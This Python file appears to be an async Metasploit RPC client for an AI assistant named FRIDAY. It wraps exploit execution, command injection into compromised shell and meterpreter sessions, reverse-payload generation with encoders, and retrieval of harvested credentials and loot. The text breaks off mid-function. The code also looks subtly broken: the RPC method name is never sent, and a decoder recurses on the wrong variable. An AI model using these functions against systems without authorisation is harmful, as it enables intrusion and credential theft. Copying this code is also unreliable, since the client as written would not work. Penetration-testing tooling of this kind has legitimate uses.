"""
FRIDAY Metasploit RPC Integration — complete asynchronous client for msfrpd.

Provides a low-level MsfrpcClient class plus high-level async tool functions
that can be registered via friday.tools.registry.
"""

from __future__ import annotations

import asyncio
import ipaddress
import os
import re
import shutil
import socket
import tempfile
import time
import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Optional

HAS_MSGPACK = False
try:
    import msgpack
    HAS_MSGPACK = True
except ImportError:
    pass

HAS_HTTPX = False
try:
    import httpx
    HAS_HTTPX = True
except ImportError:
    pass

MSF_HOST = os.environ.get("MSF_HOST", "127.0.0.1")
MSF_PORT = int(os.environ.get("MSF_PORT", "55553"))
MSF_PASS = os.environ.get("MSF_PASS", "msf")
MSF_USER = os.environ.get("MSF_USER", "msf")
MSF_SSL = os.environ.get("MSF_SSL", "false").lower() in ("true", "1", "yes")
MSF_TOKEN = os.environ.get("MSF_TOKEN", "")
CONSOLE_POLL_INTERVAL = float(os.environ.get("MSF_CONSOLE_POLL", "0.5"))
RPC_TIMEOUT = float(os.environ.get("MSF_RPC_TIMEOUT", "30.0"))


def _build_url(host: str, port: int, ssl: bool) -> str:
    proto = "https" if ssl else "http"
    return f"{proto}://{host}:{port}/api/1.0"


def _ensure_msgpack():
    if not HAS_MSGPACK:
        raise RuntimeError(
            "msgpack library is required for Metasploit RPC. "
            "Install it with: pip install msgpack"
        )


def _ensure_httpx():
    if not HAS_HTTPX:
        raise RuntimeError(
            "httpx library is required for Metasploit RPC. "
            "Install it with: pip install httpx"
        )


def msf_is_installed() -> bool:
    """Check if Metasploit (msfconsole / msfrpcd) is installed on this system."""
    return shutil.which("msfconsole") is not None or shutil.which("msfrpcd") is not None


def _epoch_ms() -> int:
    return int(time.time() * 1000)


def _sanitize_host(target: str) -> str:
    try:
        ipaddress.ip_address(target)
        return target
    except ValueError:
        pass
    try:
        return socket.gethostbyname(target)
    except socket.gaierror:
        return target


def _build_module_choice_list(raw: list[Any]) -> list[dict[str, Any]]:
    results: list[dict[str, Any]] = []
    for item in raw:
        if isinstance(item, dict):
            results.append({
                "name": item.get("name", item.get("fullname", str(item))),
                "fullname": item.get("fullname", item.get("name", "")),
                "type": item.get("type", ""),
                "rank": item.get("rank", 0),
                "disclosure_date": item.get("disclosure_date", ""),
                "description": item.get("description", ""),
            })
        elif isinstance(item, str):
            results.append({"fullname": item, "name": item.split("/")[-1] if "/" in item else item})
        elif isinstance(item, bytes):
            decoded = item.decode("utf-8", errors="replace")
            results.append({"fullname": decoded, "name": decoded.split("/")[-1] if "/" in decoded else decoded})
        else:
            results.append({"fullname": str(item), "name": str(item)})
    return results


def _format_module_path(mtype: str, path_or_name: str) -> str:
    if path_or_name.count("/") >= 2:
        return path_or_name
    prefixes = {
        "exploit": "exploit",
        "auxiliary": "auxiliary",
        "post": "post",
        "payload": "payload",
        "encoder": "encoder",
        "nop": "nop",
        "evasion": "evasion",
    }
    prefix = prefixes.get(mtype, mtype)
    if path_or_name.startswith(f"{prefix}/"):
        return path_or_name
    return f"{prefix}/{path_or_name}"


def _parse_module_info(info: dict[str, Any]) -> dict[str, Any]:
    parsed: dict[str, Any] = {
        "name": info.get("name", ""),
        "fullname": info.get("fullname", ""),
        "description": info.get("description", ""),
        "type": info.get("type", ""),
        "license": info.get("license", ""),
        "author": info.get("author", []),
        "rank": info.get("rank", 0),
        "rank_name": info.get("rank_name", ""),
        "references": info.get("references", []),
        "platform": info.get("platform", ""),
        "arch": info.get("arch", ""),
        "disclosure_date": info.get("disclosure_date", ""),
        "default_target": info.get("default_target", 0),
        "default_action": info.get("default_action", ""),
        "targets": info.get("targets", []),
        "actions": info.get("actions", []),
        "privileged": info.get("privileged", False),
        "check": info.get("check", False),
        "stance": info.get("stance", ""),
    }
    options = info.get("options", {})
    parsed["options"] = {}
    if isinstance(options, dict):
        for opt_name, opt_data in options.items():
            if isinstance(opt_data, dict):
                parsed["options"][opt_name] = {
                    "type": opt_data.get("type", ""),
                    "required": opt_data.get("required", False),
                    "default": opt_data.get("default", None),
                    "description": opt_data.get("desc", opt_data.get("description", "")),
                    "advanced": opt_data.get("advanced", False),
                    "evasion": opt_data.get("evasion", False),
                    "enabled": opt_data.get("enabled", True),
                }
            else:
                parsed["options"][opt_name] = {"value": opt_data}
    return parsed


class MsfrpcError(Exception):
    """Raised when the Metasploit RPC returns an error."""

    def __init__(self, message: str, code: Optional[int] = None, data: Any = None):
        super().__init__(message)
        self.code = code
        self.data = data


class MsfrpcAuthError(MsfrpcError):
    """Raised on authentication failure."""


class MsfrpcConnectionError(MsfrpcError):
    """Raised on connection-level failures."""


class MsfrpcTimeoutError(MsfrpcError):
    """Raised when an RPC call times out."""


class MsfrpcClient:
    """
    Async Metasploit RPC client for msfrpd (msgpack-over-HTTP).

    Environment variables:
        MSF_HOST      — msfrpd host (default 127.0.0.1)
        MSF_PORT      — msfrpd port (default 55553)
        MSF_PASS      — RPC password  (default msf)
        MSF_USER      — RPC username  (default msf)
        MSF_SSL       — use HTTPS    (default false)
        MSF_TOKEN     — pre-existing token (skip login)

    Usage:
        client = MsfrpcClient()
        await client.login()
        vers = await client.call("core.version")
        print(vers)
        await client.close()
    """

    def __init__(
        self,
        host: str = MSF_HOST,
        port: int = MSF_PORT,
        password: str = MSF_PASS,
        username: str = MSF_USER,
        ssl: bool = MSF_SSL,
        token: str = MSF_TOKEN,
        timeout: float = RPC_TIMEOUT,
    ):
        _ensure_httpx()
        _ensure_msgpack()
        self.host = host
        self.port = port
        self.password = password
        self.username = username
        self.ssl = ssl
        self.base_url = _build_url(host, port, ssl)
        self.token: str = token
        self._authenticated = bool(token)
        self._login_attempted = False
        self._timeout = timeout
        limits = httpx.Limits(max_keepalive_connections=10, max_connections=20)
        self._client = httpx.AsyncClient(
            timeout=httpx.Timeout(timeout, connect=10.0),
            limits=limits,
            verify=False if ssl else True,
        )
        self._console_cache: dict[str, dict[str, Any]] = {}
        self._job_cache: dict[str, dict[str, Any]] = {}
        self._version_info: Optional[dict[str, Any]] = None
        self._workspace_cache: Optional[list[dict[str, Any]]] = None

    # ── Authentication ──

    async def login(self, username: Optional[str] = None, password: Optional[str] = None) -> dict[str, Any]:
        if self._authenticated and self.token:
            return {"success": True, "token": self.token, "message": "Already authenticated"}
        user = username or self.username
        pwd = password or self.password
        payload = msgpack.packb({"username": user, "password": pwd})
        try:
            resp = await self._client.post(
                f"{self.base_url}/auth/login",
                content=payload,
                headers={"Content-Type": "binary/message-pack"},
            )
            raw = msgpack.unpackb(resp.content)
            if isinstance(raw, dict) and raw.get(b"error"):
                err_msg = raw.get(b"error_message", raw.get(b"error", b"unknown")).decode("utf-8", errors="replace")
                raise MsfrpcAuthError(err_msg)
            if isinstance(raw, dict):
                self.token = raw.get(b"token", b"").decode("utf-8", errors="replace")
            elif isinstance(raw, bytes):
                self.token = raw.decode("utf-8", errors="replace")
            else:
                self.token = str(raw)
            self._authenticated = bool(self.token)
            self._login_attempted = True
            return {
                "success": True,
                "token": self.token,
                "message": "Authentication successful",
                "host": self.host,
                "port": self.port,
            }
        except httpx.ConnectError as e:
            raise MsfrpcConnectionError(f"Cannot connect to msfrpd at {self.base_url}: {e}") from e
        except httpx.TimeoutException as e:
            raise MsfrpcTimeoutError(f"Login timed out connecting to {self.base_url}: {e}") from e
        except MsfrpcAuthError:
            raise
        except Exception as e:
            raise MsfrpcError(f"Login failed: {e}") from e

    async def _ensure_auth(self):
        if not self._authenticated and not self._login_attempted:
            await self.login()

    # ── Core RPC Call ──

    async def call(self, method: str, **params: Any) -> Any:
        await self._ensure_auth()
        body: dict[str, Any] = {"token": self.token}
        body.update(params)
        packed = msgpack.packb(body)
        try:
            resp = await self._client.post(
                self.base_url,
                content=packed,
                headers={"Content-Type": "binary/message-pack"},
            )
        except httpx.ConnectError as e:
            raise MsfrpcConnectionError(f"RPC connection failed to {self.base_url}: {e}") from e
        except httpx.TimeoutException as e:
            raise MsfrpcTimeoutError(f"RPC call '{method}' timed out: {e}") from e
        except Exception as e:
            raise MsfrpcError(f"RPC transport error for '{method}': {e}") from e

        try:
            data = msgpack.unpackb(resp.content, raw=False)
        except Exception as e:
            try:
                data = msgpack.unpackb(resp.content, raw=True)
            except Exception as e2:
                raise MsfrpcError(f"Failed to decode RPC response for '{method}': {e2}") from e2

        return self._decode_response(data)

    def _decode_response(self, data: Any) -> Any:
        if isinstance(data, dict):
            decoded: dict[str, Any] = {}
            for k, v in data.items():
                key = k.decode("utf-8", errors="replace") if isinstance(k, bytes) else str(k)
                decoded[key] = self._decode_value(v)
            if decoded.get("error"):
                err = decoded["error"]
                err_msg = decoded.get("error_message", decoded.get("error_string", str(err)))
                raise MsfrpcError(str(err_msg), code=int(err) if isinstance(err, (int, float)) else None)
            if decoded.get("result") == "failure":
                raise MsfrpcError(decoded.get("error_message", decoded.get("message", "RPC call failed")))
            return decoded
        if isinstance(data, (list, tuple)):
            return [self._decode_value(v) for v in data]
        return self._decode_value(data)

    def _decode_value(self, v: Any) -> Any:
        if isinstance(v, bytes):
            return v.decode("utf-8", errors="replace")
        if isinstance(v, dict):
            return {k.decode("utf-8", errors="replace") if isinstance(k, bytes) else str(k): self._decode_value(v)
                    for k, val in v.items()}
        if isinstance(v, (list, tuple)):
            return [self._decode_value(x) for x in v]
        return v

    # ── Console Management ──

    async def console_create(self) -> dict[str, Any]:
        data = await self.call("console.create")
        return {
            "id": data.get("id", ""),
            "prompt": data.get("prompt", ""),
            "busy": data.get("busy", False),
        }

    async def console_destroy(self, console_id: str) -> dict[str, Any]:
        data = await self.call("console.destroy", id=console_id)
        return {"success": data.get("result") == "success", "console_id": console_id}

    async def console_write(self, console_id: str, command: str) -> dict[str, Any]:
        data = await self.call("console.write", id=console_id, command=command)
        return {
            "wrote": data.get("wrote", 0),
            "console_id": console_id,
        }

    async def console_read(self, console_id: str) -> dict[str, Any]:
        data = await self.call("console.read", id=console_id)
        return {
            "data": data.get("data", ""),
            "prompt": data.get("prompt", ""),
            "busy": data.get("busy", False),
            "console_id": console_id,
        }

    async def console_list(self) -> list[dict[str, Any]]:
        data = await self.call("console.list")
        consoles = data.get("consoles", data.get("resources", []))
        if isinstance(consoles, list):
            return [{"id": c.get("id", c) if isinstance(c, dict) else str(c)} for c in consoles]
        return []

    async def console_execute_command(
        self,
        command: str,
        console_id: Optional[str] = None,
        timeout: float = 60.0,
        poll_interval: float = CONSOLE_POLL_INTERVAL,
    ) -> dict[str, Any]:
        create_new = console_id is None
        if create_new:
            con = await self.console_create()
            console_id = con["id"]
        else:
            con = {"id": console_id}
        await self.console_write(console_id, command + "\n")
        output_lines: list[str] = []
        start = time.monotonic()
        last_busy = True
        consecutive_idle = 0
        while time.monotonic() - start < timeout:
            await asyncio.sleep(poll_interval)
            try:
                read_result = await self.console_read(console_id)
            except Exception:
                break
            data_chunk = read_result.get("data", "")
            if data_chunk:
                output_lines.append(data_chunk)
                consecutive_idle = 0
            else:
                consecutive_idle += 1
            is_busy = read_result.get("busy", True)
            if not is_busy and not last_busy:
                if consecutive_idle >= 2:
                    break
            last_busy = is_busy
            if not is_busy and consecutive_idle >= 3:
                break
        output = "".join(output_lines).strip()
        if create_new:
            try:
                await self.console_destroy(console_id)
            except Exception:
                pass
        return {
            "console_id": console_id,
            "output": output,
            "command": command,
            "truncated": time.monotonic() - start >= timeout,
            "duration_seconds": round(time.monotonic() - start, 2),
            "console_created": create_new,
        }

    # ── Session Management ──

    async def session_list(self) -> dict[str, Any]:
        data = await self.call("session.list")
        sessions: dict[str, Any] = {}
        for sid, sinfo in data.items():
            if sid in ("result", "error"):
                continue
            if isinstance(sinfo, dict):
                sessions[str(sid)] = {
                    "id": sinfo.get("id", sid),
                    "type": sinfo.get("type", ""),
                    "tunnel_local": sinfo.get("tunnel_local", ""),
                    "tunnel_peer": sinfo.get("tunnel_peer", ""),
                    "via_exploit": sinfo.get("via_exploit", ""),
                    "via_payload": sinfo.get("via_payload", ""),
                    "description": sinfo.get("desc", sinfo.get("description", "")),
                    "workspace": sinfo.get("workspace", ""),
                    "target_host": sinfo.get("target_host", ""),
                    "target_port": sinfo.get("target_port", ""),
                    "username": sinfo.get("username", ""),
                    "uuid": sinfo.get("uuid", ""),
                    "exploit_uuid": sinfo.get("exploit_uuid", ""),
                    "session_host": sinfo.get("session_host", ""),
                    "session_port": sinfo.get("session_port", ""),
                    "platform": sinfo.get("platform", ""),
                    "arch": sinfo.get("arch", ""),
                    "routes": sinfo.get("routes", []),
                    "last_checkin": sinfo.get("last_checkin", ""),
                }
        return {
            "count": len(sessions),
            "sessions": sessions,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }

    async def session_stop(self, session_id: str) -> dict[str, Any]:
        data = await self.call("session.stop", id=session_id)
        return {
            "success": data.get("result") == "success",
            "session_id": session_id,
        }

    async def session_read(self, session_id: str) -> dict[str, Any]:
        data = await self.call("session.read", id=session_id)
        return {
            "data": data.get("data", ""),
            "session_id": session_id,
        }

    async def session_write(self, session_id: str, command: str) -> dict[str, Any]:
        data = await self.call("session.write", id=session_id, command=command)
        return {
            "wrote": data.get("wrote", 0),
            "session_id": session_id,
            "command": command,
        }

    async def session_meterpreter_write(self, session_id: str, command: str) -> dict[str, Any]:
        data = await self.call("session.meterpreter_write", id=session_id, command=command)
        return {
            "wrote": data.get("wrote", 0),
            "session_id": session_id,
            "command": command,
        }

    async def session_meterpreter_read(self, session_id: str) -> dict[str, Any]:
        data = await self.call("session.meterpreter_read", id=session_id)
        return {
            "data": data.get("data", ""),
            "session_id": session_id,
        }

    async def session_shell_write(self, session_id: str, command: str) -> dict[str, Any]:
        data = await self.call("session.shell_write", id=session_id, command=command)
        return {
            "wrote": data.get("wrote", 0),
            "session_id": session_id,
        }

    async def session_shell_read(self, session_id: str) -> dict[str, Any]:
        data = await self.call("session.shell_read", id=session_id)
        return {
            "data": data.get("data", ""),
            "session_id": session_id,
        }

    async def session_upgrade(self, session_id: str, lhost: str, lport: int) -> dict[str, Any]:
        data = await self.call("session.shell_upgrade", id=session_id, lhost=lhost, lport=lport)
        return {
            "success": data.get("result") == "success",
            "session_id": session_id,
            "lhost": lhost,
            "lport": lport,
        }

    async def session_compatible_modules(self, session_id: str) -> list[dict[str, Any]]:
        data = await self.call("session.compatible_modules", id=session_id)
        modules = data.get("modules", [])
        return _build_module_choice_list(modules)

    async def session_shell_execute(
        self,
        session_id: str,
        command: str,
        timeout: float = 30.0,
        poll_interval: float = 0.3,
    ) -> dict[str, Any]:
        session_info = await self.call("session.list")
        sinfo = session_info.get(str(session_id), {})
        if not sinfo:
            sinfo = session_info.get(session_id, {})
        session_type = sinfo.get("type", "") if isinstance(sinfo, dict) else ""
        is_meterpreter = "meterpreter" in str(session_type).lower()

        if is_meterpreter:
            await self.session_meterpreter_write(session_id, command)
        else:
            await self.session_write(session_id, command + "\n")

        output_lines: list[str] = []
        start = time.monotonic()
        consecutive_empty = 0
        while time.monotonic() - start < timeout:
            await asyncio.sleep(poll_interval)
            try:
                if is_meterpreter:
                    read_result = await self.session_meterpreter_read(session_id)
                else:
                    read_result = await self.session_shell_read(session_id)
            except Exception:
                break
            chunk = read_result.get("data", "")
            if chunk:
                output_lines.append(chunk)
                consecutive_empty = 0
            else:
                consecutive_empty += 1
            if consecutive_empty >= 5:
                break

        return {
            "session_id": session_id,
            "output": "".join(output_lines).strip(),
            "command": command,
            "truncated": time.monotonic() - start >= timeout,
            "duration_seconds": round(time.monotonic() - start, 2),
            "session_type": session_type,
        }

    # ── Module Management ──

    async def module_exploits(self) -> list[dict[str, Any]]:
        data = await self.call("module.exploits")
        return _build_module_choice_list(data.get("modules", []))

    async def module_auxiliary(self) -> list[dict[str, Any]]:
        data = await self.call("module.auxiliary")
        return _build_module_choice_list(data.get("modules", []))

    async def module_post(self) -> list[dict[str, Any]]:
        data = await self.call("module.post")
        return _build_module_choice_list(data.get("modules", []))

    async def module_payloads(self) -> list[dict[str, Any]]:
        data = await self.call("module.payloads")
        return _build_module_choice_list(data.get("modules", []))

    async def module_encoders(self) -> list[dict[str, Any]]:
        data = await self.call("module.encoders")
        return _build_module_choice_list(data.get("modules", []))

    async def module_nops(self) -> list[dict[str, Any]]:
        data = await self.call("module.nops")
        return _build_module_choice_list(data.get("modules", []))

    async def module_info(self, module_path: str) -> dict[str, Any]:
        try:
            data = await self.call("module.info", module=module_path)
        except MsfrpcError as e:
            for mtype in ("exploit", "auxiliary", "post", "payload", "encoder", "nop", "evasion"):
                try:
                    data = await self.call("module.info", module=f"{mtype}/{module_path}")
                    break
                except MsfrpcError:
                    continue
            else:
                raise e
        return _parse_module_info(data)

    async def module_search(self, query: str) -> dict[str, Any]:
        query_lower = query.lower()
        all_modules: list[dict[str, Any]] = []
        try:
            exploits = await self.module_exploits()
            all_modules.extend(exploits)
        except Exception:
            pass
        try:
            auxiliary = await self.module_auxiliary()
            all_modules.extend(auxiliary)
        except Exception:
            pass
        try:
            post = await self.module_post()
            all_modules.extend(post)
        except Exception:
            pass
        try:
            payloads = await self.module_payloads()
            all_modules.extend(payloads)
        except Exception:
            pass

        matched: list[dict[str, Any]] = []
        for mod in all_modules:
            fullname = mod.get("fullname", "").lower()
            name = mod.get("name", "").lower()
            if query_lower in fullname or query_lower in name:
                matched.append(mod)

        matched.sort(key=lambda m: m.get("fullname", ""))
        return {
            "query": query,
            "count": len(matched),
            "results": matched[:100],
            "truncated": len(matched) > 100,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }

    async def module_compatible_payloads(self, module_path: str) -> list[dict[str, Any]]:
        data = await self.call("module.compatible_payloads", module=module_path)
        return _build_module_choice_list(data.get("payloads", []))

    async def module_targets(self, module_path: str) -> list[dict[str, Any]]:
        data = await self.call("module.targets", module=module_path)
        return _build_module_choice_list(data.get("targets", []))

    async def module_actions(self, module_path: str) -> list[dict[str, Any]]:
        data = await self.call("module.actions", module=module_path)
        return _build_module_choice_list(data.get("actions", []))

    async def module_options(self, module_path: str) -> dict[str, Any]:
        data = await self.call("module.options", module=module_path)
        return _parse_module_info(data).get("options", {})

    async def module_execute(
        self,
        module_type: str,
        module_path: str,
        options: dict[str, Any],
        payload: Optional[str] = None,
        job_run: bool = True,
    ) -> dict[str, Any]:
        full_path = _format_module_path(module_type, module_path)
        rpc_method = f"module.execute"
        call_params: dict[str, Any] = {
            "type": module_type,
            "module": full_path,
            "options": options,
        }
        if payload:
            call_params["payload"] = payload
        if job_run:
            call_params["run_as_job"] = True
        data = await self.call(rpc_method, **call_params)
        job_id = data.get("job_id")
        if job_id is not None:
            return {
                "success": True,
                "job_id": int(job_id) if isinstance(job_id, (int, float, str)) else job_id,
                "module": full_path,
                "type": module_type,
                "payload": payload,
                "message": data.get("message", "Module executed as job"),
                "timestamp": datetime.now(timezone.utc).isoformat(),
            }
        return {
            "success": True,
            "module": full_path,
            "type": module_type,
            "payload": payload,
            "message": data.get("message", "Module executed"),
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }

    # ── Job Management ──

    async def job_list(self) -> dict[str, Any]:
        data = await self.call("job.list")
        jobs: dict[str, Any] = {}
        for jid, jinfo in data.items():
            if jid in ("result", "error"):
                continue
            if isinstance(jinfo, dict):
                jobs[str(jid)] = {
                    "id": jinfo.get("id", jid),
                    "name": jinfo.get("name", ""),
                    "start_time": jinfo.get("start_time", ""),
                    "uri": jinfo.get("uri", ""),
                    "info": jinfo.get("info", ""),
                }
        return {
            "count": len(jobs),
            "jobs": jobs,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }

    async def job_stop(self, job_id: int) -> dict[str, Any]:
        data = await self.call("job.stop", id=job_id)
        return {
            "success": data.get("result") == "success",
            "job_id": job_id,
        }

    async def job_info(self, job_id: int) -> dict[str, Any]:
        data = await self.call("job.info", id=job_id)
        return {
            "job_id": job_id,
            "name": data.get("name", ""),
            "start_time": data.get("start_time", ""),
            "status": data.get("status", ""),
        }

    # ── Database ──

    async def db_workspaces(self) -> list[dict[str, Any]]:
        data = await self.call("db.workspaces")
        workspaces: list[dict[str, Any]] = []
        for item in data.get("workspaces", []):
            if isinstance(item, dict):
                workspaces.append({
                    "id": item.get("id", ""),
                    "name": item.get("name", ""),
                    "created_at": item.get("created_at", ""),
                    "updated_at": item.get("updated_at", ""),
                    "boundary": item.get("boundary", ""),
                    "description": item.get("description", ""),
                    "limit_to_network": item.get("limit_to_network", ""),
                })
            elif isinstance(item, (str, bytes)):
                workspaces.append({"name": str(item)})
        return workspaces

    async def db_get_workspace(self, name: str) -> dict[str, Any]:
        data = await self.call("db.get_workspace", name=name)
        return {
            "id": data.get("id", ""),
            "name": data.get("name", name),
            "created_at": data.get("created_at", ""),
            "updated_at": data.get("updated_at", ""),
            "boundary": data.get("boundary", ""),
            "description": data.get("description", ""),
        }

    async def db_del_workspace(self, name: str) -> dict[str, Any]:
        data = await self.call("db.del_workspace", name=name)
        return {"success": data.get("result") == "success", "name": name}

    async def db_hosts(self, workspace: Optional[str] = None) -> list[dict[str, Any]]:
        params: dict[str, Any] = {}
        if workspace:
            params["workspace"] = workspace
        data = await self.call("db.hosts", **params)
        hosts: list[dict[str, Any]] = []
        for item in data.get("hosts", data.get("results", [])):
            if isinstance(item, dict):
                hosts.append({
                    "id": item.get("id", ""),
                    "address": item.get("address", item.get("host", "")),
                    "hostname": item.get("hostname", ""),
                    "os_name": item.get("os_name", item.get("os", "")),
                    "os_flavor": item.get("os_flavor", ""),
                    "os_sp": item.get("os_sp", ""),
                    "purpose": item.get("purpose", ""),
                    "comments": item.get("comments", ""),
                    "state": item.get("state", ""),
                    "workspace": item.get("workspace", workspace or ""),
                    "created_at": item.get("created_at", ""),
                    "updated_at": item.get("updated_at", ""),
                    "mac": item.get("mac", ""),
                    "vuln_count": item.get("vuln_count", 0),
                    "service_count": item.get("service_count", 0),
                })
        return hosts

    async def db_services(self, workspace: Optional[str] = None) -> list[dict[str, Any]]:
        params: dict[str, Any] = {}
        if workspace:
            params["workspace"] = workspace
        data = await self.call("db.services", **params)
        services: list[dict[str, Any]] = []
        for item in data.get("services", data.get("results", [])):
            if isinstance(item, dict):
                services.append({
                    "id": item.get("id", ""),
                    "host": item.get("host", item.get("address", "")),
                    "port": item.get("port", 0),
                    "proto": item.get("proto", "tcp"),
                    "state": item.get("state", ""),
                    "name": item.get("name", ""),
                    "info": item.get("info", ""),
                    "workspace": item.get("workspace", workspace or ""),
                    "created_at": item.get("created_at", ""),
                    "updated_at": item.get("updated_at", ""),
                })
        return services

    async def db_vulns(self, workspace: Optional[str] = None) -> list[dict[str, Any]]:
        params: dict[str, Any] = {}
        if workspace:
            params["workspace"] = workspace
        data = await self.call("db.vulns", **params)
        vulns: list[dict[str, Any]] = []
        for item in data.get("vulns", data.get("results", [])):
            if isinstance(item, dict):
                vulns.append({
                    "id": item.get("id", ""),
                    "name": item.get("name", ""),
                    "host": item.get("host", item.get("address", "")),
                    "port": item.get("port", 0),
                    "proto": item.get("proto", ""),
                    "info": item.get("info", item.get("description", "")),
                    "refs": item.get("refs", []),
                    "exploited_at": item.get("exploited_at", ""),
                    "workspace": item.get("workspace", workspace or ""),
                    "created_at": item.get("created_at", ""),
                    "updated_at": item.get("updated_at", ""),
                })
        return vulns

    async def db_creds(self, workspace: Optional[str] = None) -> list[dict[str, Any]]:
        params: dict[str, Any] = {}
        if workspace:
            params["workspace"] = workspace
        data = await self.call("db.creds", **params)
        creds: list[dict[str, Any]] = []
        for item in data.get("creds", data.get("results", [])):
            if isinstance(item, dict):
                creds.append({
                    "id": item.get("id", ""),
                    "host": item.get("host", item.get("address", "")),
                    "port": item.get("port", 0),
                    "proto": item.get("proto", ""),
                    "user": item.get("user", item.get("username", "")),
                    "pass": item.get("pass", item.get("password", "")),
                    "ptype": item.get("ptype", item.get("type", "")),
                    "origin_type": item.get("origin_type", ""),
                    "workspace": item.get("workspace", workspace or ""),
                    "created_at": item.get("created_at", ""),
                    "updated_at": item.get("updated_at", ""),
                })
        return creds

    async def db_loots(self, workspace: Optional[str] = None) -> list[dict[str, Any]]:
        params: dict[str, Any] = {}
        if workspace:
            params["workspace"] = workspace
        data = await self.call("db.loots", **params)
        loots: list[dict[str, Any]] = []
        for item in data.get("loots", data.get("results", [])):
            if isinstance(item, dict):
                loots.append({
                    "id": item.get("id", ""),
                    "host": item.get("host", item.get("address", "")),
                    "service": item.get("service", ""),
                    "ltype": item.get("ltype", item.get("type", "")),
                    "content_type": item.get("content_type", ""),
                    "data": item.get("data", ""),
                    "path": item.get("path", ""),
                    "name": item.get("name", ""),
                    "info": item.get("info", ""),
                    "workspace": item.get("workspace", workspace or ""),
                    "created_at": item.get("created_at", ""),
                })
        return loots

    async def db_notes(self, workspace: Optional[str] = None) -> list[dict[str, Any]]:
        params: dict[str, Any] = {}
        if workspace:
            params["workspace"] = workspace
        data = await self.call("db.notes", **params)
        notes: list[dict[str, Any]] = []
        for item in data.get("notes", data.get("results", [])):
            if isinstance(item, dict):
                notes.append({
                    "id": item.get("id", ""),
                    "host": item.get("host", item.get("address", "")),
                    "service": item.get("service", ""),
                    "ntype": item.get("ntype", item.get("type", "")),
                    "data": item.get("data", ""),
                    "workspace": item.get("workspace", workspace or ""),
                    "created_at": item.get("created_at", ""),
                })
        return notes

    async def db_import_data(self, data_path: str, workspace: Optional[str] = None) -> dict[str, Any]:
        params: dict[str, Any] = {"data": data_path}
        if workspace:
            params["workspace"] = workspace
        data = await self.call("db.import_data", **params)
        return {
            "success": data.get("result") == "success",
            "imported": data.get("imported", ""),
            "workspace": workspace,
            "path": data_path,
        }

    # ── Core ──

    async def core_version(self) -> dict[str, Any]:
        data = await self.call("core.version")
        version = {
            "version": data.get("version", ""),
            "ruby": data.get("ruby", ""),
            "api": data.get("api", ""),
            "framework_owner": data.get("framework_owner", ""),
            "framework_version": data.get("framework_version", ""),
        }
        self._version_info = version
        return version

    async def core_stop(self) -> dict[str, Any]:
        data = await self.call("core.stop")
        return {"success": data.get("result") == "success"}

    async def core_setg(self, variable: str, value: str) -> dict[str, Any]:
        data = await self.call("core.setg", variable=variable, value=value)
        return {"success": data.get("result") == "success", "variable": variable, "value": value}

    async def core_unsetg(self, variable: str) -> dict[str, Any]:
        data = await self.call("core.unsetg", variable=variable)
        return {"success": data.get("result") == "success", "variable": variable}

    async def core_save(self) -> dict[str, Any]:
        data = await self.call("core.save")
        return {"success": data.get("result") == "success"}

    async def core_reload_modules(self) -> dict[str, Any]:
        data = await self.call("core.reload_modules")
        return {"success": data.get("result") == "success"}

    async def core_module_stats(self) -> dict[str, Any]:
        data = await self.call("core.module_stats")
        return {
            "exploits": data.get("exploits", 0),
            "auxiliary": data.get("auxiliary", 0),
            "post": data.get("post", 0),
            "payloads": data.get("payloads", 0),
            "encoders": data.get("encoders", 0),
            "nops": data.get("nops", 0),
        }

    async def core_add_module_path(self, path: str) -> dict[str, Any]:
        data = await self.call("core.add_module_path", path=path)
        return {"success": data.get("result") == "success", "path": path}

    async def core_thread_list(self) -> list[dict[str, Any]]:
        data = await self.call("core.thread_list")
        threads: list[dict[str, Any]] = []
        for tid, tinfo in data.items():
            if tid in ("result", "error"):
                continue
            if isinstance(tinfo, dict):
                threads.append({
                    "id": tinfo.get("id", tid),
                    "status": tinfo.get("status", ""),
                    "critical": tinfo.get("critical", False),
                    "name": tinfo.get("name", ""),
                })
        return threads

    async def core_thread_kill(self, thread_id: int) -> dict[str, Any]:
        data = await self.call("core.thread_kill", id=thread_id)
        return {"success": data.get("result") == "success", "thread_id": thread_id}

    # ── Plugin Management ──

    async def plugin_load(self, plugin_path: str) -> dict[str, Any]:
        data = await self.call("plugin.load", path=plugin_path)
        return {"success": data.get("result") == "success", "plugin": plugin_path}

    async def plugin_unload(self, plugin_name: str) -> dict[str, Any]:
        data = await self.call("plugin.unload", name=plugin_name)
        return {"success": data.get("result") == "success", "plugin": plugin_name}

    async def plugin_loaded(self) -> list[str]:
        data = await self.call("plugin.loaded")
        return data.get("plugins", [])

    # ── Payload Generation ──

    async def payload_generate(
        self,
        payload: str,
        lhost: str,
        lport: int,
        format: str = "raw",
        arch: Optional[str] = None,
        platform: Optional[str] = None,
        encoder: Optional[str] = None,
        iterations: int = 0,
        bad_chars: Optional[str] = None,
        nop_sled_size: int = 0,
        template: Optional[str] = None,
        keep_template_working: bool = True,
    ) -> dict[str, Any]:
        options: dict[str, Any] = {
            "LHOST": lhost,
            "LPORT": str(lport),
        }
        if arch:
            options["ARCH"] = arch
        if platform:
            options["PLATFORM"] = platform
        if encoder:
            options["ENCODER"] = encoder
        if iterations:
            options["ITERATIONS"] = str(iterations)
        if bad_chars:
            options["BADCHARS"] = bad_chars
        if nop_sled_size:
            options["NOP_SLED_SIZE"] = str(nop_sled_size)
        if template:
            options["TEMPLATE"] = template
        options["KEEP_TEMPLATE_WORKING"] = str(keep_template_working).lower()

        rpc_params: dict[str, Any] = {
            "payload": payload,
            "options": options,
            "format": format,
        }
        data = await self.call("payload.generate", **rpc_params)
        raw_bytes = data.get("payload", b"")
        if isinstance(raw_bytes, (str, bytes)):
            encoded = raw_bytes if isinstance(raw_bytes, str) else raw_bytes.hex()
        else:
            encoded = str(raw_bytes)
        return {
            "success": True,
            "payload": encoded,
            "payload_module": payload,
            "lhost": lhost,
            "lport": lport,
            "format": format,
            "size": len(encoded) if isinstance(encoded, str) else 0,
            "arch": arch,
            "platform": platform,
            "encoder": encoder,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }

    # ── Health ──

    async def health_check(self) -> dict[str, Any]:
        try:
            t0 = time.monotonic()
            data = await self.call("core.version")
            elapsed = int((time.monotonic() - t0) * 1000)
            return {
                "alive": True,
                "version": data.get("version", "unknown"),
                "ruby": data.get("ruby", "unknown"),
                "api": data.get("api", "unknown"),
